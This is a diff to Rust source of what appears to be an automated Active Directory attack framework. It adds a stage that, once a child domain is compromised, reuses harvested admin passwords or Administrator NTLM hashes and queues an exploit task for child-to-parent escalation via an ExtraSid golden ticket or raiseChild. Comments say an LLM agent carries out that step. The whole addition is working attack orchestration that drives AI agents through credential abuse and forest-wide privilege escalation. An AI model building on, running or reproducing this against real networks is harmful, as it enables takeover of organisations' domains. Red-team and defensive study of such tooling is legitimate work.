@@ -164,6 +164,219 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
             }
         }
 
+        // Child-to-parent escalation (ExtraSid via raiseChild)
+        //
+        // When a parent_child trust is discovered and the child domain is dominated,
+        // dispatch a child_to_parent exploit task.  The LLM prompt offers raiseChild
+        // (automated) and manual ExtraSid golden ticket as alternatives.
+        {
+            let state = dispatcher.state.read().await;
+            if state.has_domain_admin && !state.trusted_domains.is_empty() {
+                let child_work: Vec<(String, String, String, String)> = state
+                    .trusted_domains
+                    .values()
+                    .filter(|trust| trust.is_parent_child())
+                    .filter_map(|trust| {
+                        let parent_domain = &trust.domain;
+
+                        // Skip if parent is already dominated
+                        if state
+                            .dominated_domains
+                            .contains(&parent_domain.to_lowercase())
+                        {
+                            return None;
+                        }
+
+                        // Find a dominated child domain for this parent
+                        // (child FQDN ends with .{parent})
+                        let child_domain = state.dominated_domains.iter().find(|d| {
+                            d.to_lowercase()
+                                .ends_with(&format!(".{}", parent_domain.to_lowercase()))
+                        })?;
+
+                        let key = format!("raise_child:{}", child_domain.to_lowercase());
+                        if state.is_processed(DEDUP_TRUST_FOLLOW, &key) {
+                            return None;
+                        }
+
+                        let dc_ip = state
+                            .domain_controllers
+                            .get(&child_domain.to_lowercase())
+                            .cloned()?;
+
+                        Some((key, child_domain.clone(), parent_domain.clone(), dc_ip))
+                    })
+                    .collect();
+                drop(state);
+
+                for (key, child_domain, parent_domain, dc_ip) in child_work {
+                    // Find admin credential for the child domain:
+                    // prefer password, fall back to NTLM hash.
+                    let (cred_payload, auth_method): (Option<serde_json::Value>, &str) = {
+                        let s = dispatcher.state.read().await;
+                        let cd = child_domain.to_lowercase();
+
+                        let pw_cred = s
+                            .credentials
+                            .iter()
+                            .find(|c| {
+                                c.is_admin
+                                    && !c.password.is_empty()
+                                    && c.domain.to_lowercase() == cd
+                            })
+                            .cloned();
+
+                        if let Some(cred) = pw_cred {
+                            (
+                                Some(json!({
+                                    "username": cred.username,
+                                    "password": cred.password,
+                                })),
+                                "password",
+                            )
+                        } else {
+                            let admin_hash = s
+                                .hashes
+                                .iter()
+                                .find(|h| {
+                                    h.username.to_lowercase() == "administrator"
+                                        && h.domain.to_lowercase() == cd
+                                        && h.hash_type.to_uppercase() == "NTLM"
+                                })
+                                .cloned();
+
+                            if let Some(h) = admin_hash {
+                                (
+                                    Some(json!({
+                                        "username": "Administrator",
+                                        "admin_hash": h.hash_value,
+                                    })),
+                                    "hash",
+                                )
+                            } else {
+                                (None, "none")
+                            }
+                        }
+                    };
+
+                    let cred = match cred_payload {
+                        Some(c) => c,
+                        None => {
+                            debug!(
+                                child_domain = %child_domain,
+                                parent_domain = %parent_domain,
+                                "No admin cred/hash for child domain — deferring child-to-parent"
+                            );
+                            continue;
+                        }
+                    };
+
+                    // Publish vulnerability
+                    let vuln_id = format!(
+                        "child_to_parent_{}_{}",
+                        child_domain.to_lowercase().replace('.', "_"),
+                        parent_domain.to_lowercase().replace('.', "_"),
+                    );
+                    {
+                        let mut details = std::collections::HashMap::new();
+                        details.insert(
+                            "source_domain".into(),
+                            serde_json::Value::String(child_domain.clone()),
+                        );
+                        details.insert(
+                            "target_domain".into(),
+                            serde_json::Value::String(parent_domain.clone()),
+                        );
+                        details.insert(
+                            "note".into(),
+                            serde_json::Value::String(format!(
+                                "Child-to-parent escalation via ExtraSid — {} → {}",
+                                child_domain, parent_domain
+                            )),
+                        );
+                        let vuln = ares_core::models::VulnerabilityInfo {
+                            vuln_id: vuln_id.clone(),
+                            vuln_type: "child_to_parent".to_string(),
+                            target: dc_ip.clone(),
+                            discovered_by: "trust_automation".to_string(),
+                            discovered_at: chrono::Utc::now(),
+                            details,
+                            recommended_agent: String::new(),
+                            priority: 1,
+                        };
+                        let _ = dispatcher
+                            .state
+                            .publish_vulnerability(&dispatcher.queue, vuln)
+                            .await;
+                    }
+
+                    // Dispatch child-to-parent exploit task.  The LLM prompt
+                    // offers raiseChild (automated) and manual ExtraSid golden
+                    // ticket creation as alternatives.
+                    let mut payload = json!({
+                        "technique": "create_inter_realm_ticket",
+                        "vuln_type": "child_to_parent",
+                        "domain": child_domain,
+                        "trusted_domain": parent_domain,
+                        "target_domain": parent_domain,
+                        "target": &dc_ip,
+                        "dc_ip": dc_ip,
+                        "vuln_id": &vuln_id,
+                    });
+                    // Merge credential fields
+                    if let Some(obj) = cred.as_object() {
+                        for (k, v) in obj {
+                            payload[k] = v.clone();
+                        }
+                    }
+                    // Add domain SIDs if already resolved
+                    {
+                        let s = dispatcher.state.read().await;
+                        if let Some(sid) = s.domain_sids.get(&child_domain.to_lowercase()) {
+                            payload["source_sid"] = json!(sid);
+                        }
+                        if let Some(sid) = s.domain_sids.get(&parent_domain.to_lowercase()) {
+                            payload["target_sid"] = json!(sid);
+                        }
+                    }
+
+                    match dispatcher
+                        .throttled_submit("exploit", "privesc", payload, 1)
+                        .await
+                    {
+                        Ok(Some(task_id)) => {
+                            info!(
+                                task_id = %task_id,
+                                child_domain = %child_domain,
+                                parent_domain = %parent_domain,
+                                auth = auth_method,
+                                "Child-to-parent escalation dispatched"
+                            );
+                            let _ = dispatcher
+                                .state
+                                .mark_exploited(&dispatcher.queue, &vuln_id)
+                                .await;
+                            dispatcher
+                                .state
+                                .write()
+                                .await
+                                .mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+                            let _ = dispatcher
+                                .state
+                                .persist_dedup(&dispatcher.queue, DEDUP_TRUST_FOLLOW, &key)
+                                .await;
+                        }
+                        Ok(None) => {
+                            debug!("Child-to-parent deferred by throttler");
+                        }
+                        Err(e) => {
+                            warn!(err = %e, "Failed to dispatch child-to-parent escalation")
+                        }
+                    }
+                }
+            }
+        }
+
         // Extract trust keys for known cross-forest trusts
         {
             let state = dispatcher.state.read().await;
